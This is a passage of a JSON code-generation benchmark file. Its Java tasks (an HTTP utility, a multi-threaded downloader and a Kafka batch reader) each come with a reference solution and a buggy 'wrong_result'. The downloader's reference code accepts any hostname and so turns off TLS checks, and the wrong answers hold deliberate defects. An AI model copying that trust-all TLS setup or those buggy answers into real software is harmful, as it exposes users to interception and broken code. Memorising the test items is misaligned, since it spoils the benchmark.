(MapUtils.isNotEmpty(params)) {\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                builder.append(PARAM_SEPARATE)\n                        .append(entry.getKey())\n                        .append(KV_SEPARATE)\n                        .append(entry.getValue());\n            }\n        }\n        return doGet(builder.toString());\n    }\n\n    public static Resp doPost(String url) {\n        return doPost(url, null);\n    }\n\n    public static Resp doPost(String url, Map<String, String> params) {\n        FormBody.Builder builder = new FormBody.Builder();\n        if (MapUtils.isNotEmpty(params)) {\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                builder.add(entry.getKey(), entry.getValue());\n            }\n        }\n        Request request = new Request.Builder().post(builder.build()).url(url).build();\n        return executeRequest(request);\n    }\n\n    private static Resp executeRequest(Request request, int retryTime) {\n        try {\n            Response response = client.newCall(request).execute();\n            if (response.isSuccessful()) {\n                return Resp.builder().code(response.code())\n                        .body(bodyToString(response.body())).build();\n            }\n            if (--retryTime > 0) {\n                TimeUnit.MILLISECONDS.sleep(100);\n                return executeRequest(request, retryTime);\n            }\n            return Resp.builder().code(response.code())\n                    .body(bodyToString(response.body()))\n                    .message(\"Invoke failed, status code is not 200\")\n                    .build();\n        } catch (Exception e) {\n            if (--retryTime > 0) {\n                try {\n                    TimeUnit.MILLISECONDS.sleep(100);\n                } catch (InterruptedException e1) {\n                    // ignore\n                }\n                return executeRequest(request, retryTime);\n            }\n            return Resp.builder().code(500)\n                    .message(\"Invoke occurred exception, request=\" + request.toString() + \";message=\" + e.getMessage())\n                    .build();\n        }\n    }\n\n    private static String bodyToString(ResponseBody body) throws IOException {\n        return body == null ? \"\" : body.string();\n    }\n\n    public static class Resp {\n        private int code;\n        private String body;\n        private String message;\n\n        public static RespBuilder builder() {\n            return new RespBuilder();\n        }\n\n        public static class RespBuilder {\n            private int code;\n            private String body;\n            private String message;\n\n            public RespBuilder code(int code) {\n                this.code = code;\n                return this;\n            }\n\n            public RespBuilder body(String body) {\n                this.body = body;\n                return this;\n            }\n\n            public RespBuilder message(String message) {\n                this.message = message;\n                return this;\n            }\n\n            public Resp build() {\n                return new Resp(code, body, message);\n            }\n        }\n\n        Resp(int code, String body, String message) {\n            this.code = code;\n            this.body = body;\n            this.message = message;\n        }\n\n        public int getCode() {\n            return code;\n        }\n\n        public String getBody() {\n            return body;\n        }\n\n        public String getMessage() {\n            return message;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "public class HttpUtil {\n    public static final String QUESTION_SEPARATE = \"?\";\n    public static final String PARAM_SEPARATE = \"&\";\n    public static final String KV_SEPARATE = \"=\";\n    private static final int CONNECT_TIMEOUT = 10;\n    private static final int READ_TIMEOUT = 10;\n    private static final OkHttpClient client = new OkHttpClient.Builder()\n        .connectTimeout(CONNECT_TIMEOUT, TimeUnit.SECONDS)\n        .readTimeout(READ_TIMEOUT, TimeUnit.SECONDS)\n        .build();\n\n    public Resp doGet(String url) {\n        Request request = new Request.Builder().url(url).build();\n        return executeRequest(request, 3);\n    }\n\n    public Resp doGetWithHeader(String url, Map<String, String> headers) {\n        Request.Builder builder = new Request.Builder().url(url);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            builder.addHeader(entry.getKey(), entry.getValue());\n        }\n        Request request = builder.build();\n        return executeRequest(request, 3);\n    }\n\n    public Resp doGet(String url, Map<String, String> params) {\n        StringBuilder query = new StringBuilder();\n        for (Map.Entry<String, String> entry : params.entrySet()) {\n            if (query.length() > 0) {\n                query.append(PARAM_SEPARATE);\n            }\n            query.append(entry.getKey()).append(KV_SEPARATE).append(entry.getValue());\n        }\n        String fullUrl = url + (query.length() > 0 ? QUESTION_SEPARATE + query : \"\");\n        Request request = new Request.Builder().url(fullUrl).build();\n        return executeRequest(request, 3);\n    }\n\n    public Resp doPost(String url) {\n        Request request = new Request.Builder().url(url).build();\n        return executeRequest(request, 3);\n    }\n\n    public Resp doPost(String url, Map<String, String> params) {\n        FormBody.Builder formBuilder = new FormBody.Builder();\n        for (Map.Entry<String, String> entry : params.entrySet()) {\n            formBuilder.add(entry.getKey(), entry.getValue());\n        }\n        Request request = new Request.Builder().url(url).post(formBuilder.build()).build();\n        return executeRequest(request, 3);\n    }\n\n    private Resp executeRequest(Request request, int retryTime) {\n        Resp resp = null;\n        for (int i = 0; i < retryTime; i++) {\n            try {\n                Response response = client.newCall(request).execute();\n                try {\n                    if (response.isSuccessful()) {\n                        String bodyStr = bodyToString(response.body());\n                        resp = Resp.builder()\n                            .code(response.code())\n                            .body(bodyStr)\n                            .build();\n                        return resp;\n                    } else {\n                        resp = Resp.builder()\n                            .code(response.code())\n                            .message(\"HTTP error: \" + response.code())\n                            .build();\n                        return resp;\n                    }\n                } finally {\n                    response.close();\n                }\n            } catch (IOException e) {\n                if (i == retryTime - 1) {\n                    resp = Resp.builder()\n                        .code(503)\n                        .message(\"Request failed after \" + retryTime + \" retries: \" + e.getMessage())\n                        .build();\n                    return resp;\n                }\n            }\n        }\n        return resp;\n    }\n\n    private String bodyToString(ResponseBody body) {\n        if (body == null) {\n            return \"\";\n        }\n        try {\n            return body.string();\n        } catch (IOException e) {\n            return \"Error reading response body: \" + e.getMessage();\n        }\n    }\n\n    static class Resp {\n        private final int code;\n        private final String body;\n        private final String message;\n\n        private Resp(RespBuilder builder) {\n            this.code = builder.code;\n            this.body = builder.body;\n            this.message = builder.message;\n        }\n\n        public int getCode() {\n            return code;\n        }\n\n        public String getBody() {\n            return body;\n        }\n\n        public String getMessage() {\n            return message;\n        }\n\n        public static RespBuilder builder() {\n            return new RespBuilder();\n        }\n\n        static class RespBuilder {\n            private int code;\n            private String body;\n            private String message;\n\n            RespBuilder code(int code) {\n                this.code = code;\n                return this;\n            }\n\n            RespBuilder body(String body) {\n                this.body = body;\n                return this;\n            }\n\n            RespBuilder message(String message) {\n                this.message = message;\n                return this;\n            }\n\n            Resp build() {\n                return new Resp(this);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 249,
    "Instruction": "Task Description: Create a Java class for HTTP downloading with support for multi-threaded downloads, range requests, and connection pooling.\n\nClass Description: HttpDownloader is a Java class that extends InputStream to provide HTTP downloading capabilities. It supports multi-threaded downloads, range requests, connection pooling, and retry mechanisms. The class manages download tasks through a thread pool and handles response streaming efficiently.\n\nAttributes:\n\ncontentType: String - MIME type of the downloaded content\ncontentLength: long - Total size of the content being downloaded\ncontentEnd: long - Ending byte position for downloads\nheader: Headers - HTTP response headers\nstatusCode: int - HTTP status code\ndirectUrl: String - Final URL after redirects\ncurConnId: volatile static int - Connection counter\nclosed: volatile boolean - Flag indicating if downloader is closed\nconnId: int - Current connection ID\nis: InputStream - Current input stream\ncallableQueue: Queue<Callable<InputStream>> - Queue of download tasks\nfutureQueue: Queue<Future<InputStream>> - Queue of future results\ndownloaderMap: static HashMap<String, HttpDownloader> - Cache of active downloaders\nexecutorService: ExecutorService - Thread pool for download tasks\nsupportRange: boolean - Flag for server range support\nblockSize: int - Size of each download block (default 10MB)\nthreadNum: int - Number of download threads (default 2)\ncookie: String - Cookie header value\nreferer: String - Referer header value\nblockCounter: int - Counter for downloaded blocks\ndownloadClient: OkHttpClient - Custom HTTP client for downloads\ndefaultClient: OkHttpClient - Default HTTP client configuration\n\nMethods:\n\nHttpDownloader(Map<String, String> params) - Constructor - Initializes downloader with configuration parameters\ncreateDownloadTask(String url, Map<String, String> headers) - void - Creates download tasks based on range and thread configuration\ndownloadTask(String url, Map<String, String> headers, String range, int sliceNum) -> InputStream - Performs actual HTTP download\n_downloadTask(String url, Map<String, String> headers, String range, int sliceNum) -> InputStream - Internal download implementation\nread(byte[] buffer, int off, int len) -> int - Reads data from download stream\nread() -> int - Throws IOException (not implemented)\nclose() - void - Cleans up resources and stops downloads\nrunTask(int num) - void - Starts specified number of download tasks",
    "Canonical_solution": "import java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.Map;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.TreeMap;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.Queue;\nimport java.util.LinkedList;\nimport java.util.regex.Pattern;\nimport java.util.regex.Matcher;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.Callable;\n\nimport okhttp3.OkHttpClient;\nimport okhttp3.Dispatcher;\nimport okhttp3.FormBody;\nimport okhttp3.RequestBody;\nimport okhttp3.Request;\nimport okhttp3.Headers;\nimport okhttp3.Response;\nimport okhttp3.Call;\nimport org.json.JSONObject;\n\npublic class HttpDownloader extends InputStream {\n    public String contentType = \"\";\n    public long contentLength = -1;\n    long contentEnd;\n    public Headers header;\n    public int statusCode = 200;\n    String directUrl = null;\n    volatile static int curConnId = 0;\n    volatile boolean closed = false;\n    int connId;\n    InputStream is = null;\n    Queue<Callable<InputStream>> callableQueue = new LinkedList<>();\n    Queue<Future<InputStream>> futureQueue = new LinkedList<>();\n    static HashMap<String, HttpDownloader> downloaderMap = new HashMap<>();\n    ExecutorService executorService = Executors.newFixedThreadPool(128);\n    boolean supportRange = true;\n    int blockSize = 10 * 1024 * 1024;\n    int threadNum = 2;\n    String cookie = null;\n    String referer = null;\n    int blockCounter = 0;\n    OkHttpClient downloadClient = null;\n    OkHttpClient defaultClient = new OkHttpClient.Builder()\n        .connectTimeout(30, TimeUnit.SECONDS)\n        .readTimeout(30, TimeUnit.SECONDS)\n        .writeTimeout(30, TimeUnit.SECONDS)\n        .hostnameVerifier((hostname, session) -> true)\n        .sslSocketFactory(new MySSLCompat(), MySSLCompat.TM)\n        .build();\n\n    public HttpDownloader(Map<String, String> params) {\n        Dispatcher dispatcher = new Dispatcher();\n        dispatcher.setMaxRequests(3000000);\n        dispatcher.setMaxRequestsPerHost(1000000);\n        downloadClient = defaultClient.newBuilder()\n            .dispatcher(dispatcher)\n            .connectTimeout(3, TimeUnit.SECONDS)\n            .readTimeout(3, TimeUnit.SECONDS)\n            .writeTimeout(3, TimeUnit.SECONDS)\n            .build();\n        \n        connId = curConnId++;\n        String url = params.get(\"url\");\n        downloaderMap.entrySet().removeIf(entry -> entry.getValue().closed);\n        HttpDownloader cacheDownloader = downloaderMap.get(url);\n        if (cacheDownloader != null) {\n            cacheDownloader.close();\n        }\n        downloaderMap.put(url, this);\n\n        if(params.get(\"thread\") != null){\n            threadNum = Integer.parseInt(params.get(\"thread\"));\n        }\n        if(params.get(\"size\") != null){\n            blockSize = Integer.parseInt(params.get(\"size\"));\n        }\n        if(params.get(\"cookie\") != null){\n            cookie = params.get(\"cookie\");\n        }\n\n        Map<String, String> headers = new TreeMap<>(String.CASE_INSENSITIVE_ORDER);\n        List<String> keys = Arrays.asList(\"referer\", \"icy-metadata\", \"range\", \"connection\", \"accept-encoding\", \"user-agent\", \"cookie\", \"authorization\");\n        for (String key : params.keySet()) if (keys.contains(key)) headers.put(key, params.get(key));\n        if(url.contains(\"\u5938\u514b\")) {\n            headers.put(\"user-agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) quark-cloud-drive/2.5.20 Chrome/100.0.4896.160 Electron/18.3.5.4-b478491100 Safari/537.36 Channel/pckk_other_ch\");\n        }\n        String range = \"\";\n        if (params.get(\"range\") != null) {\n            range = params.get(\"range\");\n        }\n        this.getHeader(url, headers);\n        this.createDownloadTask(directUrl, headers);\n    }\n\n    private void createDownloadTask(String url, Map<String, String> headers) {\n        Request.Builder requestBuilder = new Request.Builder().url(url);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            requestBuilder.addHeader(entry.getKey(), entry.getValue());\n        }\n        Request request = requestBuilder.build();\n        \n        if(!this.supportRange || threadNum == 0) {\n            Callable<InputStream> callable = () -> {\n                return downloadTask(url, headers, \"\", 0);\n            };\n            callableQueue.add(callable);\n            return;\n        }\n        \n        long start = 0; \n        long end = this.contentEnd;\n        String range = request.headers().get(\"Range\");\n        range = range == null ? \"0-\" : range;\n        range = range + \"-\" + this.contentEnd;\n        range = range.replace(\"--\", \"-\");\n        String pattern = \"bytes=(\\\\d+)-(\\\\d+)\";\n        Pattern r = Pattern.compile(pattern);\n        Matcher m = r.matcher(range);\n        if (m.find()) {\n            String startString = m.group(1); \n            String endString = m.group(2);\n            start = Long.parseLong(startString); \n            end = Long.parseLong(endString);\n        }\n\n        int sliceNum = 0;\n        while (start <= end) {\n            long curEnd = start + blockSize - 1;\n            curEnd = curEnd > end ? end : curEnd;\n            String ra = \"bytes=\" + start + \"-\" + curEnd;\n            final int _sliceNum = sliceNum;\n            Callable<InputStream> callable = () -> {\n                return downloadTask(url, headers, ra, _sliceNum);\n            };\n            callableQueue.add(callable);\n            start = curEnd + 1;\n            sliceNum++;\n        }\n    }\n\n    private InputStream downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        return _downloadTask(url,headers,range,sliceNum);\n    }\n\n    private InputStream _downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        if(closed){\n            return null;\n        }\n        Request.Builder requestBuilder = new Request.Builder().url(url);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            requestBuilder.addHeader(entry.getKey(), entry.getValue());\n        }\n        if (!range.isEmpty()) {\n            requestBuilder.removeHeader(\"Range\").addHeader(\"Range\", range);\n        }\n        if (cookie != null) {\n            requestBuilder.removeHeader(\"Cookie\").addHeader(\"Cookie\", cookie);\n        }\n        if (referer != null) {\n            requestBuilder.removeHeader(\"Referer\").addHeader(\"Referer\", referer);\n        }\n        Request request = requestBuilder.build();\n        int retryCount = 0;\n        int maxRetry = 5;\n        byte[] downloadbBuffer = new byte[1024*1024];\n        Response response = null;\n        Call call = null;\n        boolean directResp = false;\n        while (retryCount < maxRetry && !closed) {\n            try {\n                directResp = false;\n                call = downloadClient.newCall(request);\n                response = call.execute();\n                if (!response.isSuccessful()) {\n                    continue;\n                }\n                if (range.isEmpty()) {\n                    directResp = true;\n                    return response.body().byteStream();\n                }\n                if(sliceNum==0){\n                    directResp = true;\n                    return response.body().byteStream();\n                }\n                \n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                int bytesRead;\n                while (!closed && (bytesRead = response.body().byteStream().read(downloadbBuffer)) != -1) {\n                    baos.write(downloadbBuffer, 0, bytesRead);\n                }\n                return new ByteArrayInputStream(baos.toByteArray());\n            } catch (Exception e) {} finally {\n                if(response != null && !directResp){\n                    call.cancel();\n                    response.close();\n                }\n                retryCount++;\n            }\n        }\n        return null;\n    }\n\n    @Override\n    public synchronized int read(byte[] buffer, int off, int len) throws IOException {\n        try {\n            if (closed) {\n                return -1;\n            }\n            \n            if (this.is == null ) {\n                runTask(threadNum < 1 ? 1 : threadNum);\n                this.is = this.futureQueue.remove().get();\n                runTask(1);\n                blockCounter++;\n            }\n            int ol = this.is.read(buffer, off, len);\n            if ( ol == -1 ) {\n                this.is = this.futureQueue.remove().get();\n                runTask(1);\n                blockCounter++;\n                return this.is.read(buffer, off, len);\n            } \n            return ol;\n        } catch (Exception e) {\n            return -1;\n        }\n    }\n    \n    @Override\n    public int read() throws IOException {\n        throw new IOException(\"\u65b9\u6cd5\u672a\u5b9e\u73b0\uff0c\u4e0d\u80fd\u8c03\u7528\uff01\");\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (closed) {\n            return;\n        }\n        closed = true;\n        if(this.executorService != null) {\n            this.executorService.shutdownNow();\n        }\n        futureQueue.clear();\n        callableQueue.clear();\n    }\n\n    private void runTask(int num) {\n        while(num-- > 0 && callableQueue.size() > 0) {\n            Future<InputStream> future = this.executorService.submit(callableQueue.remove());\n            this.futureQueue.add(future);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "public class HttpDownloader extends InputStream {\n    private final OkHttpClient downloadClient;\n    private final ExecutorService executorService;\n    private final Queue<Callable<InputStream>> callableQueue = new LinkedList<>();\n    private final Queue<Future<InputStream>> futureQueue = new LinkedList<>();\n    private final List<InputStream> inputStreams = new ArrayList<>();\n    private final int blockSize;\n    private final int threadNum;\n    private final String cookie;\n    private final String referer;\n    private final String directUrl;\n    private final long contentLength;\n    private final boolean supportRange;\n    private volatile boolean closed = false;\n    private volatile int currentStreamIndex = 0;\n    private final static HashMap<String, HttpDownloader> downloaderMap = new HashMap<>();\n    private final static AtomicInteger curConnId = new AtomicInteger(0);\n    private final int connId;\n    private final String contentType;\n    private final int statusCode;\n    private final Headers header;\n    private final long contentEnd;\n    private final InputStream is;\n    private final OkHttpClient defaultClient;\n    private final String userAgent;\n\n    public HttpDownloader(Map<String, String> params) {\n        this.userAgent = params.getOrDefault(\"userAgent\", \"Java-HttpDownloader\");\n        this.blockSize = Integer.parseInt(params.getOrDefault(\"blockSize\", \"10485760\"));\n        this.threadNum = Integer.parseInt(params.getOrDefault(\"threadNum\", \"2\"));\n        this.cookie = params.getOrDefault(\"cookie\", \"\");\n        this.referer = params.getOrDefault(\"referer\", \"\");\n        this.directUrl = params.getOrDefault(\"url\", \"\");\n        this.contentLength = Long.parseLong(params.getOrDefault(\"contentLength\", \"0\"));\n        this.supportRange = Boolean.parseBoolean(params.getOrDefault(\"supportRange\", \"true\"));\n        this.contentType = params.getOrDefault(\"contentType\", \"\");\n        this.statusCode = Integer.parseInt(params.getOrDefault(\"statusCode\", \"200\"));\n        this.header = Headers.of(params.getOrDefault(\"header\", \"\"));\n        this.contentEnd = Long.parseLong(params.getOrDefault(\"contentEnd\", \"0\"));\n        this.is = new ByteArrayInputStream(new byte[0]);\n        this.defaultClient = new OkHttpClient();\n        this.downloadClient = new OkHttpClient.Builder()\n                .connectionPool(new ConnectionPool(5, 1, TimeUnit.MINUTES))\n                .addNetworkInterceptor(new HttpLoggingInterceptor().setLevel(HttpLoggingInterceptor.Level.BODY))\n                .build();\n        this.executorService = Executors.newFixedThreadPool(threadNum);\n        this.connId = curConnId.getAndIncrement();\n        downloaderMap.put(directUrl, this);\n    }\n\n    public void createDownloadTask(String url, Map<String, String> headers) {\n        if (contentLength == 0 || !supportRange) return;\n        int totalSlices = (int) Math.ceil((double) contentLength / blockSize);\n        for (int i = 0; i < Math.min(threadNum, totalSlices); i++) {\n            String range = \"bytes=\" + (i * blockSize) + \"-\" + ((i + 1) * blockSize - 1);\n            callableQueue.add(() -> downloadTask(url, headers, range, i));\n        }\n    }\n\n    public void runTask(int num) {\n        for (int i = 0; i < num && !closed; i++) {\n            if (!callableQueue.isEmpty()) {\n                Callable<InputStream> task = callableQueue.poll();\n                futureQueue.add(executorService.submit(task));\n            }\n        }\n    }\n\n    private InputStream downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        Request.Builder requestBuilder = new Request.Builder()\n                .url(url)\n                .headers(Headers.of(\"User-Agent\", userAgent, \"Cookie\", cookie, \"Referer\", referer))\n                .get();\n        if (supportRange) {\n            requestBuilder.addHeader(\"Range\", range);\n        }\n        Request request = requestBuilder.build();\n        Response response = null;\n        for (int retry = 0; retry < 3 && !closed; retry++) {\n            try {\n                response = downloadClient.newCall(request).execute();\n                if (response.isSuccessful()) {\n                    return response.body().byteStream();\n                }\n            } catch (IOException e) {\n                if (retry < 2) {\n                    try {\n                        Thread.sleep(1000);\n                    } catch (InterruptedException ex) {\n                        Thread.currentThread().interrupt();\n                    }\n                }\n            }\n        }\n        throw new IOException(\"Failed to download task after retries\");\n    }\n\n    private InputStream _downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        Request.Builder requestBuilder = new Request.Builder()\n                .url(url)\n                .headers(Headers.of(\"User-Agent\", userAgent, \"Cookie\", cookie, \"Referer\", referer))\n                .get();\n        if (supportRange) {\n            requestBuilder.addHeader(\"Range\", range);\n        }\n        Request request = requestBuilder.build();\n        Response response = null;\n        for (int retry = 0; retry < 3 && !closed; retry++) {\n            try {\n                response = downloadClient.newCall(request).execute();\n                if (response.isSuccessful()) {\n                    return response.body().byteStream();\n                }\n            } catch (IOException e) {\n                if (retry < 2) {\n                    try {\n                        Thread.sleep(1000);\n                    } catch (InterruptedException ex) {\n                        Thread.currentThread().interrupt();\n                    }\n                }\n            }\n        }\n        throw new IOException(\"Failed to download task after retries\");\n    }\n\n    @Override\n    public int read(byte[] buffer, int off, int len) throws IOException {\n        if (closed) {\n            throw new IOException(\"Downloader is closed\");\n        }\n        while (currentStreamIndex < inputStreams.size()) {\n            InputStream is = inputStreams.get(currentStreamIndex);\n            int bytesRead = is.read(buffer, off, len);\n            if (bytesRead == -1) {\n                currentStreamIndex++;\n                continue;\n            }\n            return bytesRead;\n        }\n        return -1;\n    }\n\n    @Override\n    public int read() throws IOException {\n        throw new IOException(\"read() is not supported\");\n    }\n\n    public void close() {\n        if (closed) return;\n        closed = true;\n        for (Future<InputStream> future : futureQueue) {\n            future.cancel(true);\n        }\n        executorService.shutdownNow();\n        for (InputStream is : inputStreams) {\n            try {\n                is.close();\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n        downloaderMap.remove(directUrl);\n    }\n}"
  },
  {
    "Task_id": 251,
    "Instruction": "Task Description: Create a Kafka consumer class that reads messages from specified Kafka topic partitions and integrates with Spring Batch for state management and offset tracking.\n\nClass Description: KafkaItemReader is a Spring Batch ItemReader implementation that consumes messages from Kafka topics. It maintains partition offsets, supports state persistence between batches, and provides configurable polling behavior.\n\nAttributes:\n- TOPIC_PARTITION_OFFSETS: [String] - Key for storing partition offsets in execution context\n- DEFAULT_POLL_TIMEOUT: [long] - Default timeout duration for consumer polling (30 seconds)\n- topicPartitions: [List<TopicPartition>] - List of topic partitions to consume from\n- partitionOffsets: [Map<TopicPartition, Long>] - Current offsets for each partition\n- kafkaConsumer: [KafkaConsumer<K, V>] - Kafka consumer instance\n- consumerProperties: [Properties] - Configuration properties for Kafka consumer\n- consumerRecords: [Iterator<ConsumerRecord<K, V>>] - Iterator for currently polled records\n- pollTimeout: [Duration] - Timeout duration for polling messages\n- saveState: [boolean] - Flag indicating whether to save consumer state\n\nMethods:\n- KafkaItemReader(Properties, String, Integer...) -> [Constructor] - Creates reader with properties, topic name, and partition array\n- KafkaItemReader(Properties, String, List<Integer>) -> [Constructor] - Creates reader with properties, topic name, and partition list\n- open(ExecutionContext) -> [void] - Initializes Kafka consumer, restores offsets if available, and seeks to appropriate positions\n- read() -> [V] - Reads next message from Kafka, returns message value or null if no messages available\n- update(ExecutionContext) -> [void] - Saves current partition offsets to execution context and commits offsets to Kafka\n- close() -> [void] - Closes the Kafka consumer when reader is no longer needed",
    "Canonical_solution": "import org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.TopicPartition;\nimport org.springframework.batch.item.ExecutionContext;\nimport org.springframework.batch.item.support.AbstractItemStreamItemReader;\nimport org.springframework.lang.Nullable;\nimport org.springframework.util.Assert;\n\nimport java.time.Duration;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Properties;\n\npublic class KafkaItemReader<K, V> extends AbstractItemStreamItemReader<V> {\n\n    private static final String TOPIC_PARTITION_OFFSETS = \"topic.partition.offsets\";\n    private static final long DEFAULT_POLL_TIMEOUT = 30L;\n\n    private final List<TopicPartition> topicPartitions;\n    private Map<TopicPartition, Long> partitionOffsets;\n    private KafkaConsumer<K, V> kafkaConsumer;\n    private final Properties consumerProperties;\n    private Iterator<ConsumerRecord<K, V>> consumerRecords;\n    private Duration pollTimeout = Duration.ofSeconds(DEFAULT_POLL_TIMEOUT);\n    private boolean saveState = true;\n\n    public KafkaItemReader(Properties consumerProperties, String topicName, Integer... partitions) {\n        this(consumerProperties, topicName, Arrays.asList(partitions));\n    }\n\n    public KafkaItemReader(Properties consumerProperties, String topicName, List<Integer> partitions) {\n        Assert.notNull(consumerProperties, \"Consumer properties must not be null\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG),\n                ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG + \" property must be provided\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.GROUP_ID_CONFIG),\n                ConsumerConfig.GROUP_ID_CONFIG + \" property must be provided\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG),\n                ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG + \" property must be provided\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG),\n                ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG + \" property must be provided\");\n        this.consumerProperties = consumerProperties;\n        Assert.hasLength(topicName, \"Topic name must not be null or empty\");\n        Assert.isTrue(!partitions.isEmpty(), \"At least one partition must be provided\");\n        this.topicPartitions = new ArrayList<>();\n        for (Integer partition : partitions) {\n            this.topicPartitions.add(new TopicPartition(topicName, partition));\n        }\n    }\n\n    @Override\n    public void open(ExecutionContext executionContext) {\n        this.kafkaConsumer = new KafkaConsumer<>(this.consumerProperties);\n        if (this.partitionOffsets == null) {\n            this.partitionOffsets = new HashMap<>();\n            for (TopicPartition topicPartition : this.topicPartitions) {\n                this.partitionOffsets.put(topicPartition, 0L);\n            }\n        }\n        if (this.saveState && executionContext.containsKey(TOPIC_PARTITION_OFFSETS)) {\n            Map<TopicPartition, Long> offsets = (Map<TopicPartition, Long>) executionContext\n                    .get(TOPIC_PARTITION_OFFSETS);\n            for (Map.Entry<TopicPartition, Long> entry : offsets.entrySet()) {\n                this.partitionOffsets.put(entry.getKey(), entry.getValue() == 0 ? 0 : entry.getValue() + 1);\n            }\n        }\n        this.kafkaConsumer.assign(this.topicPartitions);\n        this.partitionOffsets.forEach(this.kafkaConsumer::seek);\n    }\n\n    @Nullable\n    @Override\n    public V read() {\n        if (this.consumerRecords == null || !this.consumerRecords.hasNext()) {\n            this.consumerRecords = this.kafkaConsumer.poll(this.pollTimeout).iterator();\n        }\n        if (this.consumerRecords.hasNext()) {\n            ConsumerRecord<K, V> record = this.consumerRecords.next();\n            this.partitionOffsets.put(new TopicPartition(record.topic(), record.partition()), record.offset());\n            return record.value();\n        }\n        else {\n            return null;\n        }\n    }\n\n    @Override\n    public void update(ExecutionContext executionContext) {\n        if (this.saveState) {\n            executionContext.put(TOPIC_PARTITION_OFFSETS, new HashMap<>(this.partitionOffsets));\n        }\n        this.kafkaConsumer.commitSync();\n    }\n\n    @Override\n    public void close() {\n        if (this.kafkaConsumer != null) {\n            this.kafkaConsumer.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "wrong_result": "public class KafkaItemReader<K, V> implements ItemReader<V> {\n    private static final String TOPIC_PARTITION_OFFSETS = \"topicPartitionOffsets\";\n    private static final long DEFAULT_POLL_TIMEOUT = 30;\n    \n    private final Properties consumerProperties;\n    private final String topicName;\n    private final List<TopicPartition> topicPartitions;\n    private final Map<TopicPartition, Long> partitionOffsets;\n    private KafkaConsumer<K, V> kafkaConsumer;\n    private Iterator<ConsumerRecord<K, V>> consumerRecords;\n    private Duration pollTimeout;\n    private boolean saveState;\n    \n    public KafkaItemReader(Properties consumerProperties, String topicName, Integer... partitions) {\n        this.consumerProperties = consumerProperties;\n        this.topicName = topicName;\n        this.pollTimeout = Duration.ofSeconds(DEFAULT_POLL_TIMEOUT);\n        this.saveState = true;\n        this.topicPartitions = Arrays.stream(partitions)\n                .map(partition -> new TopicPartition(topicName, partition))\n                .collect(Collectors.toList());\n        this.partitionOffsets = new HashMap<>();\n    }\n    \n    public KafkaItemReader(Properties consumerProperties, String topicName, List<Integer> partitions) {\n        this.consumerProperties = consumerProperties;\n        this.topicName = topicName;\n        this.pollTimeout = Duration.ofSeconds(DEFAULT_POLL_TIMEOUT);\n        this.saveState = true;\n        this.topicPartitions = partitions.stream()\n                .map(partition -> new TopicPartition(topicName, partition))\n                .collect(Collectors.toList());\n        this.partitionOffsets = new HashMap<>();\n    }\n    \n    @Override\n    public void open(ExecutionContext executionContext) {\n        kafkaConsumer = new KafkaConsumer<>(consumerProperties);\n        if (saveState) {\n            for (TopicPartition tp : topicPartitions) {\n                Long offset = (Long) executionContext.get(TOPIC_PARTITION_OFFSETS + tp.partition());\n                if (offset != null) {\n                    partitionOffsets.put(tp, offset);\n                    kafkaConsumer.seek(tp, offset);\n                } else {\n                    kafkaConsumer.seek(tp, 0);\n                }\n            }\n        } else {\n            for (TopicPartition tp : topicPartitions) {\n                kafkaConsumer.seek(tp, 0);\n            }\n        }\n    }\n    \n    @Override\n    public V read() {\n        if (consumerRecords.hasNext()) {\n            ConsumerRecord<K, V> record = consumerRecords.next();\n            partitionOffsets.put(record.partition(), record.offset() + 1);\n            return record.value();\n        } else {\n            List<ConsumerRecord<K, V>> polledRecords = kafkaConsumer.poll(pollTimeout.toMillis());\n            if (!polledRecords.isEmpty()) {\n                consumerRecords = polledRecords.iterator();\n                return consumerRecords.next().value();\n            }\n            return null;\n        }\n    }\n    \n    public void update(ExecutionContext executionContext) {\n        if (saveState) {\n            for (Map.Entry<TopicPartition, Long> entry : partitionOffsets.entrySet()) {\n                executionContext.put(TOPIC_PARTITION_OFFSETS + entry.getKey().partition(), entry.getValue());\n            }\n            kafkaConsumer.commitSync();\n        }\n    }\n    \n    public void close() {\n        if (kafkaConsumer != null) {\n            kafkaConsumer.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 252,
